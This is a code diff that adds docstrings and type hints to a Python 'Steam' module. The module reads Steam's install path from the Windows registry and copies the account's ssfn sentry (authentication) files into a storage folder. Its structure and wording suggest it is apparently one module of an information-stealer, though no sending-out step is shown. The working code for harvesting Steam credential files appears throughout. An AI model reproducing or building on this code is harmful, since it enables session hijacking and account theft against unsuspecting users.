@@ -5,23 +5,31 @@ from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW6
 
 
 class Steam:
-
+    """
+    Collects configs from the Steam.
+    """
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
         self.__storage_path = storage_path
         self.__folder = folder
         self.__errors = errors
 
-    def __create_folder(self):
-
+    def __create_folder(self) -> None:
+        """
+        Creates storage for the Steam module.
+        :return: None
+        """
         storage_path = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(storage_path):
             makedirs(storage_path)
 
     @staticmethod
-    def __get_steam_path():
-
+    def __get_steam_path() -> str:
+        """
+        Gets the Steam installation path from the registry.
+        :return: str
+        """
         try:
             key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
         except FileNotFoundError:
@@ -31,8 +39,11 @@ class Steam:
 
         return value
 
-    def __get_steam_files(self):
-
+    def __get_steam_files(self) -> None:
+        """
+        Collects configs from the Steam.
+        :return: None
+        """
         steam_path = self.__get_steam_path()
 
         if not path.exists(steam_path):
@@ -51,8 +62,11 @@ class Steam:
         for ssfn in ssfns:
             copy(rf"{steam_path}\{ssfn}", storage_path)
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the Steam collection module.
+        :return: None
+        """
         try:
 
             self.__create_folder()
